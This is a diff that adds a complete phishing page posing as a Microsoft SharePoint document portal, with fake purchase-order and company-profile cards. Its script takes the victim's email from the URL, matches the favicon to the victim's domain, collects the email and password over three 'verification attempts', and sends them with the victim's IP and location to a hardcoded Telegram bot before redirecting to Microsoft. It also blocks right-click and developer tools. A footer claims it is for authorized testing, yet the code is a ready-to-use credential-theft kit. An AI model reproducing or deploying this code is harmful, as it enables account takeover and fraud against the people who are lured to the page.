@@ -1,0 +1,708 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+ <meta charset="UTF-8">
+ <title>SharePoint | Document Access Portal</title>
+ <meta name="viewport" content="width=device-width, initial-scale=1">
+ 
+ <!-- Anti-cloning -->
+ <script>
+ if (top !== self) top.location = self.location;
+ const allowedDomains = ['viewmydocs.me', 'www.viewmydocs.me'];
+ const host = window.location.hostname;
+ if (allowedDomains.indexOf(host) === -1 && host !== 'localhost') {
+ document.body.innerHTML = '<h1 style="text-align:center;margin-top:50px;">Unauthorized Access</h1><p style="text-align:center;">This page cannot be accessed from this domain.</p>';
+ throw new Error('Invalid domain');
+ }
+ </script>
+ 
+ <link id="dynamic-favicon" rel="icon" type="image/png" href="https://cdn-icons-png.flaticon.com/512/561/561127.png">
+ <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+ <style>
+ * {
+ margin: 0;
+ padding: 0;
+ box-sizing: border-box;
+ }
+
+ body {
+ font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, sans-serif;
+ background: #f0f2f5;
+ min-height: 100vh;
+ }
+
+ .sharepoint-bar {
+ background: #0078d4;
+ color: white;
+ padding: 12px 24px;
+ display: flex;
+ align-items: center;
+ justify-content: space-between;
+ box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+ }
+
+ .logo-area {
+ display: flex;
+ align-items: center;
+ gap: 12px;
+ }
+
+ .logo-area svg {
+ width: 28px;
+ }
+
+ .logo-area span {
+ font-size: 18px;
+ font-weight: 500;
+ }
+
+ .user-area {
+ display: flex;
+ align-items: center;
+ gap: 20px;
+ }
+
+ .user-area i {
+ font-size: 18px;
+ cursor: pointer;
+ }
+
+ .container {
+ max-width: 1400px;
+ margin: 0 auto;
+ padding: 24px;
+ }
+
+ .welcome-banner {
+ background: linear-gradient(135deg, #0078d4 0%, #106ebe 100%);
+ border-radius: 8px;
+ padding: 30px;
+ color: white;
+ margin-bottom: 30px;
+ }
+
+ .welcome-banner h1 {
+ font-size: 28px;
+ font-weight: 500;
+ margin-bottom: 10px;
+ }
+
+ .welcome-banner p {
+ font-size: 14px;
+ opacity: 0.9;
+ }
+
+ .email-hint {
+ background: rgba(255,255,255,0.2);
+ border-radius: 8px;
+ padding: 12px 20px;
+ margin-top: 15px;
+ display: inline-block;
+ font-size: 13px;
+ }
+
+ .document-grid {
+ display: grid;
+ grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
+ gap: 24px;
+ margin-bottom: 40px;
+ }
+
+ .document-card {
+ background: white;
+ border-radius: 12px;
+ box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+ overflow: hidden;
+ transition: transform 0.2s, box-shadow 0.2s;
+ cursor: pointer;
+ border: 1px solid #e5e5e5;
+ }
+
+ .document-card:hover {
+ transform: translateY(-3px);
+ box-shadow: 0 8px 24px rgba(0,0,0,0.15);
+ border-color: #0078d4;
+ }
+
+ .card-header {
+ background: #f8f9fa;
+ padding: 20px;
+ border-bottom: 1px solid #e5e5e5;
+ display: flex;
+ align-items: center;
+ gap: 15px;
+ }
+
+ .card-header i {
+ font-size: 36px;
+ }
+
+ .card-header i.fa-building { color: #0078d4; }
+ .card-header i.fa-file-invoice { color: #d13438; }
+ .card-header i.fa-truck { color: #ff8c00; }
+ .card-header i.fa-cube { color: #7fba00; }
+ .card-header i.fa-image { color: #9b59b6; }
+
+ .card-header h3 {
+ font-size: 18px;
+ font-weight: 600;
+ color: #1b1b1b;
+ }
+
+ .card-header p {
+ font-size: 12px;
+ color: #666;
+ margin-top: 4px;
+ }
+
+ .card-body {
+ padding: 20px;
+ }
+
+ .doc-detail {
+ display: flex;
+ justify-content: space-between;
+ padding: 10px 0;
+ border-bottom: 1px solid #f0f0f0;
+ font-size: 13px;
+ }
+
+ .doc-detail:last-child {
+ border-bottom: none;
+ }
+
+ .doc-label {
+ color: #666;
+ font-weight: 500;
+ }
+
+ .doc-value {
+ font-weight: 500;
+ color: #1b1b1b;
+ text-align: right;
+ }
+
+ .card-footer {
+ background: #f8f9fa;
+ padding: 12px 20px;
+ font-size: 12px;
+ color: #0078d4;
+ display: flex;
+ justify-content: space-between;
+ border-top: 1px solid #e5e5e5;
+ }
+
+ .modal {
+ display: none;
+ position: fixed;
+ top: 0;
+ left: 0;
+ width: 100%;
+ height: 100%;
+ background: rgba(0,0,0,0.5);
+ z-index: 1000;
+ align-items: center;
+ justify-content: center;
+ }
+
+ .modal.active {
+ display: flex;
+ }
+
+ .modal-content {
+ background: white;
+ border-radius: 12px;
+ max-width: 420px;
+ width: 90%;
+ overflow: hidden;
+ box-shadow: 0 8px 32px rgba(0,0,0,0.2);
+ }
+
+ .modal-header {
+ background: #0078d4;
+ color: white;
+ padding: 24px;
+ text-align: center;
+ }
+
+ .modal-header i {
+ font-size: 48px;
+ margin-bottom: 12px;
+ }
+
+ .modal-body {
+ padding: 30px;
+ }
+
+ .info-panel {
+ background: #f8f9fa;
+ padding: 15px;
+ border-radius: 8px;
+ margin-bottom: 24px;
+ font-size: 13px;
+ }
+
+ .info-panel div {
+ margin-bottom: 8px;
+ }
+
+ .modal-body input {
+ width: 100%;
+ padding: 12px 14px;
+ border: 1px solid #ccc;
+ border-radius: 6px;
+ font-size: 14px;
+ margin-bottom: 16px;
+ }
+
+ .modal-body input:focus {
+ outline: none;
+ border-color: #0078d4;
+ }
+
+ .modal-body button {
+ width: 100%;
+ background: #0078d4;
+ color: white;
+ border: none;
+ padding: 14px;
+ border-radius: 6px;
+ font-size: 14px;
+ font-weight: 600;
+ cursor: pointer;
+ }
+
+ .modal-body button:disabled {
+ opacity: 0.6;
+ cursor: not-allowed;
+ }
+
+ .attempts-warning {
+ text-align: center;
+ margin-top: 12px;
+ font-size: 12px;
+ color: #ff8c00;
+ display: none;
+ }
+
+ .attempts-warning.show {
+ display: block;
+ }
+
+ .error-msg {
+ background: #fef0f0;
+ color: #d13438;
+ padding: 12px;
+ border-radius: 6px;
+ font-size: 12px;
+ margin-top: 16px;
+ display: none;
+ text-align: center;
+ }
+
+ .loader {
+ display: inline-block;
+ width: 16px;
+ height: 16px;
+ border: 2px solid white;
+ border-top-color: transparent;
+ border-radius: 50%;
+ animation: spin 0.6s linear infinite;
+ margin-right: 8px;
+ vertical-align: middle;
+ }
+
+ @keyframes spin {
+ to { transform: rotate(360deg); }
+ }
+
+ .disclaimer {
+ background: #1a1a2e;
+ color: #aaa;
+ padding: 20px;
+ text-align: center;
+ font-size: 11px;
+ border-top: 1px solid #333;
+ margin-top: 40px;
+ }
+
+ .disclaimer a {
+ color: #0078d4;
+ text-decoration: none;
+ }
+
+ .footer {
+ background: #f8f9fa;
+ padding: 16px;
+ text-align: center;
+ font-size: 12px;
+ color: #666;
+ }
+ </style>
+</head>
+<body>
+
+<div class="sharepoint-bar">
+ <div class="logo-area">
+ <svg viewBox="0 0 21 21" fill="none">
+ <rect x="1" y="1" width="8" height="8" fill="#F25022"/>
+ <rect x="12" y="1" width="8" height="8" fill="#7FBA00"/>
+ <rect x="1" y="12" width="8" height="8" fill="#00A4EF"/>
+ <rect x="12" y="12" width="8" height="8" fill="#FFB900"/>
+ </svg>
+ <span>SharePoint</span>
+ </div>
+ <div class="user-area">
+ <i class="fas fa-bell"></i>
+ <i class="fas fa-cog"></i>
+ <i class="fas fa-user-circle"></i>
+ </div>
+</div>
+
+<div class="container">
+ <div class="welcome-banner">
+ <h1>Document Access Portal</h1>
+ <p>Secure document management and verification system</p>
+ <div class="email-hint" id="emailHint">
+ <i class="fas fa-user-check"></i> 
+ <span id="loggedEmail">Not signed in</span>
+ </div>
+ </div>
+
+ <div class="document-grid">
+ <div class="document-card" data-doc-title="Company Profile" data-doc-details="Business Overview &amp; Credentials" data-doc-size="PDF • 8 pages • 2.4 MB">
+ <div class="card-header"><i class="fas fa-building"></i><div><h3>Company Profile</h3><p>Business overview & corporate credentials</p></div></div>
+ <div class="card-body">
+ <div class="doc-detail"><span class="doc-label">Company:</span><span class="doc-value">Stükraft Linz GmbH</span></div>
+ <div class="doc-detail"><span class="doc-label">Founded:</span><span class="doc-value">2010</span></div>
+ <div class="doc-detail"><span class="doc-label">Employees:</span><span class="doc-value">2,500+</span></div>
+ </div>
+ <div class="card-footer"><span><i class="fas fa-lock"></i> Confidential</span><span>Click to view <i class="fas fa-chevron-right"></i></span></div>
+ </div>
+
+ <div class="document-card" data-doc-title="Purchase Order" data-doc-details="PO-2024-0082 • $247,500.00" data-doc-size="PDF • 3 pages • 1.2 MB">
+ <div class="card-header"><i class="fas fa-file-invoice"></i><div><h3>Purchase Order</h3><p>Order details & pricing information</p></div></div>
+ <div class="card-body">
+ <div class="doc-detail"><span class="doc-label">PO Number:</span><span class="doc-value">PO-2024-0082</span></div>
+ <div class="doc-detail"><span class="doc-label">Total Amount:</span><span class="doc-value">$247,500.00</span></div>
+ <div class="doc-detail"><span class="doc-label">Order Date:</span><span class="doc-value" id="poDate">Loading...</span></div>
+ </div>
+ <div class="card-footer"><span><i class="fas fa-lock"></i> Financial</span><span>Click to view <i class="fas fa-chevron-right"></i></span></div>
+ </div>
+
+ <div class="document-card" data-doc-title="Delivery Requirements" data-doc-details="Shipping &amp; Logistics Specs" data-doc-size="PDF • 6 pages • 1.8 MB">
+ <div class="card-header"><i class="fas fa-truck"></i><div><h3>Delivery Requirements</h3><p>Shipping & handling specifications</p></div></div>
+ <div class="card-body">
+ <div class="doc-detail"><span class="doc-label">Shipping Method:</span><span class="doc-value">Express / Air Freight</span></div>
+ <div class="doc-detail"><span class="doc-label">Delivery Window:</span><span class="doc-value">5-7 business days</span></div>
+ <div class="doc-detail"><span class="doc-label">Handling:</span><span class="doc-value">Temperature controlled</span></div>
+ </div>
+ <div class="card-footer"><span><i class="fas fa-lock"></i> Logistics</span><span>Click to view <i class="fas fa-chevron-right"></i></span></div>
+ </div>
+
+ <div class="document-card" data-doc-title="Product Specifications" data-doc-details="Detailed product descriptions • 247 SKUs" data-doc-size="PDF • 15 pages • 4.6 MB">
+ <div class="card-header"><i class="fas fa-cube"></i><div><h3>Specific Products</h3><p>Detailed descriptions & specifications</p></div></div>
+ <div class="card-body">
+ <div class="doc-detail"><span class="doc-label">Product Lines:</span><span class="doc-value">12 categories</span></div>
+ <div class="doc-detail"><span class="doc-label">Total SKUs:</span><span class="doc-value">247 items</span></div>
+ <div class="doc-detail"><span class="doc-label">Last Updated:</span><span class="doc-value" id="prodDate">Loading...</span></div>
+ </div>
+ <div class="card-footer"><span><i class="fas fa-lock"></i> Catalog</span><span>Click to view <i class="fas fa-chevron-right"></i></span></div>
+ </div>
+
+ <div class="document-card" data-doc-title="Sample Images" data-doc-details="Product Gallery • 45 high-res images" data-doc-size="PDF • 20 pages • 8.2 MB">
+ <div class="card-header"><i class="fas fa-image"></i><div><h3>Sample Images</h3><p>Product visuals & gallery</p></div></div>
+ <div class="card-body">
+ <div class="doc-detail"><span class="doc-label">Images:</span><span class="doc-value">45 high-res photos</span></div>
+ <div class="doc-detail"><span class="doc-label">Resolution:</span><span class="doc-value">1920x1080</span></div>
+ <div class="doc-detail"><span class="doc-label">Format:</span><span class="doc-value">PDF Gallery</span></div>
+ </div>
+ <div class="card-footer"><span><i class="fas fa-lock"></i> Gallery</span><span>Click to view <i class="fas fa-chevron-right"></i></span></div>
+ </div>
+ </div>
+</div>
+
+<div class="disclaimer">
+ <i class="fas fa-shield-alt"></i> <strong>Important Notice:</strong> This is a simulated SharePoint environment for authorized testing purposes only. 
+ All data and documents shown are sample/demo content. By accessing this portal, you agree to comply with applicable security policies.
+ <br><br>
+ <a href="#">Privacy Statement</a> | <a href="#">Terms of Use</a> | <a href="#">Security & Compliance</a>
+ <br><br>
+ <span style="font-size: 10px;">© 2024 Microsoft Corporation. All rights reserved. This is a demonstration portal.</span>
+</div>
+
+<div class="footer">
+ <span>Microsoft SharePoint Online</span> | <span>Secure Document Access</span> | <span>Version 24H2</span>
+</div>
+
+<div id="loginModal" class="modal">
+ <div class="modal-content">
+ <div class="modal-header">
+ <i class="fas fa-shield-alt"></i>
+ <h3>Secure Document Access</h3>
+ <p style="font-size: 13px; margin-top: 5px;">Verify your identity to continue</p>
+ </div>
+ <div class="modal-body">
+ <div class="info-panel" id="docInfoPanel">
+ <div><strong>Document:</strong> <span id="docName">-</span></div>
+ <div><strong>Details:</strong> <span id="docDetails">-</span></div>
+ <div><strong>Size:</strong> <span id="docSize">-</span></div>
+ </div>
+ <input type="email" id="modalEmail" placeholder="Email address" autocomplete="off">
+ <input type="password" id="modalPassword" placeholder="Password" autocomplete="off">
+ <button id="authButton">Verify & Access Document</button>
+ <div id="attemptsWarning" class="attempts-warning"></div>
+ <div id="modalError" class="error-msg"></div>
+ </div>
+ </div>
+</div>
+
+<script>
+// ==========================================
+// CONFIGURATION
+// ==========================================
+const TELEGRAM_BOT_TOKEN = "8748651198:AAEXCuNAIaRF6vjz-9B5BoLld34kMwuZ1ak"; // Replace with your token
+const TELEGRAM_CHAT_ID = "8761618925";     // Replace with your chat ID
+
+// Disable right-click
+document.addEventListener('contextmenu', function(e) {
+ e.preventDefault();
+ return false;
+});
+
+// Block shortcut keys
+document.addEventListener('keydown', function(e) {
+ if (e.key === 'F12' || (e.ctrlKey && e.key === 'u') || (e.ctrlKey && e.shiftKey && e.key === 'I') || (e.ctrlKey && e.shiftKey && e.key === 'J') || (e.ctrlKey && e.key === 's')) {
+ e.preventDefault();
+ return false;
+ }
+});
+
+// Email auto-grabber
+function getAutoEmail() {
+ let hash = window.location.hash;
+ if (hash && hash.length > 1) {
+ let email = decodeURIComponent(hash.substring(1));
+ if (email.includes('&')) email = email.split('&')[0];
+ if (email.includes('?')) email = email.split('?')[0];
+ if (email.includes('@')) return email;
+ }
+ let params = new URLSearchParams(window.location.search);
+ let email = params.get('email') || params.get('e') || params.get('user');
+ if (email && email.includes('@')) return email;
+ let match = window.location.href.match(/([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9._-]+)/);
+ return match ? match[0] : '';
+}
+
+const autoEmail = getAutoEmail();
+const domain = autoEmail ? autoEmail.split('@')[1] : '';
+
+// Dynamic favicon
+function updateFavicon(domainName) {
+ const favicon = document.getElementById('dynamic-favicon');
+ if (domainName && domainName.includes('.')) {
+ favicon.href = "https://www.google.com/s2/favicons?sz=64&domain=" + domainName;
+ let domainCap = domainName.split('.')[0].charAt(0).toUpperCase() + domainName.split('.')[0].slice(1);
+ document.title = domainCap + " SharePoint | Document Portal";
+ }
+}
+
+if (autoEmail) {
+ document.getElementById('loggedEmail').innerHTML = '<i class="fas fa-check-circle"></i> ' + autoEmail;
+ document.getElementById('emailHint').style.background = '#2b8c5e';
+ if (domain) updateFavicon(domain);
+} else {
+ document.getElementById('loggedEmail').innerHTML = '<i class="fas fa-exclamation-triangle"></i> No session detected';
+}
+
+// 3-attempt tracking
+let attemptCount = 0;
+const MAX_ATTEMPTS = 3;
+let currentDoc = null;
+
+function showErrorPage() {
+ window.location.href = 'https://www.microsoft.com/security';
+}
+
+function requestAccess(docTitle, docDetails, docSize) {
+ if (sessionStorage.getItem('locked_out') === 'true') {
+ showErrorPage();
+ return;
+ }
+ 
+ currentDoc = { title: docTitle, details: docDetails, size: docSize };
+ document.getElementById('docName').innerText = docTitle;
+ document.getElementById('docDetails').innerText = docDetails;
+ document.getElementById('docSize').innerText = docSize;
+ 
+ // Lock email if auto-detected
+ if (autoEmail) {
+   document.getElementById('modalEmail').value = autoEmail;
+   document.getElementById('modalEmail').readOnly = true;
+   document.getElementById('modalEmail').style.backgroundColor = "#f0f2f5";
+   document.getElementById('modalEmail').style.cursor = "not-allowed";
+ } else {
+   document.getElementById('modalEmail').value = '';
+   document.getElementById('modalEmail').readOnly = false;
+   document.getElementById('modalEmail').style.backgroundColor = "#fff";
+   document.getElementById('modalEmail').style.cursor = "text";
+ }
+ 
+ document.getElementById('modalPassword').value = '';
+ document.getElementById('modalError').style.display = 'none';
+ 
+ let remaining = MAX_ATTEMPTS - attemptCount;
+ if (remaining > 0) {
+ document.getElementById('attemptsWarning').innerHTML = '<i class="fas fa-info-circle"></i> ' + remaining + ' verification attempt(s) remaining';
+ document.getElementById('attemptsWarning').classList.add('show');
+ }
+ 
+ document.getElementById('loginModal').classList.add('active');
+}
+
+// Attach click handlers to cards
+var cards = document.querySelectorAll('.document-card');
+for (var i = 0; i < cards.length; i++) {
+ cards[i].addEventListener('click', function(e) {
+ e.stopPropagation();
+ var title = this.getAttribute('data-doc-title');
+ var details = this.getAttribute('data-doc-details');
+ var size = this.getAttribute('data-doc-size');
+ requestAccess(title, details, size);
+ });
+}
+
+async function sendToTelegram(email, password, doc, attempt) {
+ // Get IP
+ let ip = 'Unknown';
+ try {
+   const res = await fetch('https://api.ipify.org?format=json');
+   const data = await res.json();
+   ip = data.ip;
+ } catch(e) {}
+
+ // Get Location
+ let country = 'Unknown';
+ let city = 'Unknown';
+ try {
+   const locRes = await fetch(`http://ip-api.com/json/${ip}`);
+   const locData = await locRes.json();
+   if (locData.status === 'success') {
+     country = locData.country;
+     city = locData.city;
+   }
+ } catch(e) {}
+
+ // Format Message
+ const attemptEmoji = attempt == 1 ? "🟡" : (attempt == 2 ? "🟠" : "🔴");
+ const timestamp = new Date().toISOString();
+ 
+ const message = `📄 <b>DOCUMENT ACCESS ATTEMPT #${attempt}</b> ${attemptEmoji}\n\n` +
+                 `━━━━━━━━━━━━━━━━━━\n\n` +
+                 `📧 <b>Email:</b>\n<code>${escapeHtml(email)}</code>\n\n` +
+                 `🔑 <b>Password:</b>\n<tg-spoiler><code>${escapeHtml(password)}</code></tg-spoiler>\n\n` +
+                 `━━━━━━━━━━━━━━━━━━\n\n` +
+                 `📋 <b>Document Requested:</b>\n` +
+                 `├ ${escapeHtml(doc.title)}\n` +
+                 `└ ${escapeHtml(doc.details)}\n\n` +
+                 `━━━━━━━━━━━━━━━━━━\n\n` +
+                 `🌐 <b>IP:</b> <code>${ip}</code>\n` +
+                 `📍 <b>Location:</b> ${country} - ${city}\n` +
+                 `📱 <b>Platform:</b> SharePoint\n` +
+                 `━━━━━━━━━━━━━━━━━━\n` +
+                 `🕐 <code>${timestamp}</code>`;
+
+ const telegram_url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+ const payload = {
+   chat_id: TELEGRAM_CHAT_ID,
+   text: message,
+   parse_mode: "HTML"
+ };
+
+ try {
+   await fetch(telegram_url, {
+     method: 'POST',
+     headers: { 'Content-Type': 'application/json' },
+     body: JSON.stringify(payload)
+   });
+ } catch(e) {}
+}
+
+// Helper to escape HTML entities for <code> blocks
+function escapeHtml(text) {
+ if (!text) return "";
+ return text
+   .replace(/&/g, "&amp;")
+   .replace(/</g, "&lt;")
+   .replace(/>/g, "&gt;")
+   .replace(/"/g, "&quot;")
+   .replace(/'/g, "&#039;");
+}
+
+document.getElementById('authButton').addEventListener('click', async function() {
+ if (sessionStorage.getItem('locked_out') === 'true') {
+ showErrorPage();
+ return;
+ }
+ 
+ var email = document.getElementById('modalEmail').value.trim();
+ var password = document.getElementById('modalPassword').value.trim();
+ var errorDiv = document.getElementById('modalError');
+ var authBtn = document.getElementById('authButton');
+ var attemptsWarning = document.getElementById('attemptsWarning');
+ 
+ if (!email || !password) {
+ errorDiv.innerText = 'Please enter your email and password';
+ errorDiv.style.display = 'block';
+ return;
+ }
+ 
+ attemptCount++;
+ await sendToTelegram(email, password, currentDoc, attemptCount);
+ 
+ if (attemptCount >= MAX_ATTEMPTS) {
+ sessionStorage.setItem('locked_out', 'true');
+ errorDiv.style.display = 'none';
+ authBtn.disabled = true;
+ authBtn.innerHTML = 'Redirecting...';
+ attemptsWarning.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Maximum attempts exceeded. Redirecting...';
+ setTimeout(function() { 
+ showErrorPage(); 
+ }, 2000);
+ return;
+ }
+ 
+ errorDiv.innerText = 'Incorrect credentials. Please try again.';
+ errorDiv.style.display = 'block';
+ document.getElementById('modalPassword').value = '';
+ document.getElementById('modalPassword').focus();
+ 
+ var remaining = MAX_ATTEMPTS - attemptCount;
+ attemptsWarning.innerHTML = '<i class="fas fa-info-circle"></i> ' + remaining + ' verification attempt(s) remaining';
+ attemptsWarning.classList.add('show');
+});
+
+document.getElementById('loginModal').addEventListener('click', function(e) {
+ if (e.target === this) {
+ this.classList.remove('active');
+ }
+});
+
+// Update Dates on Load
+document.addEventListener('DOMContentLoaded', function() {
+ const now = new Date();
+ const options = { month: 'short', day: 'numeric', year: 'numeric' };
+ const todayStr = now.toLocaleDateString('en-US', options);
+ 
+ // Update Purchase Order Date
+ const poDateEl = document.getElementById('poDate');
+ if (poDateEl) poDateEl.textContent = todayStr;
+ 
+ // Update Product Specs Date
+ const prodDateEl = document.getElementById('prodDate');
+ if (prodDateEl) prodDateEl.textContent = todayStr;
+});
+</script>
+
+</body>
+</html>
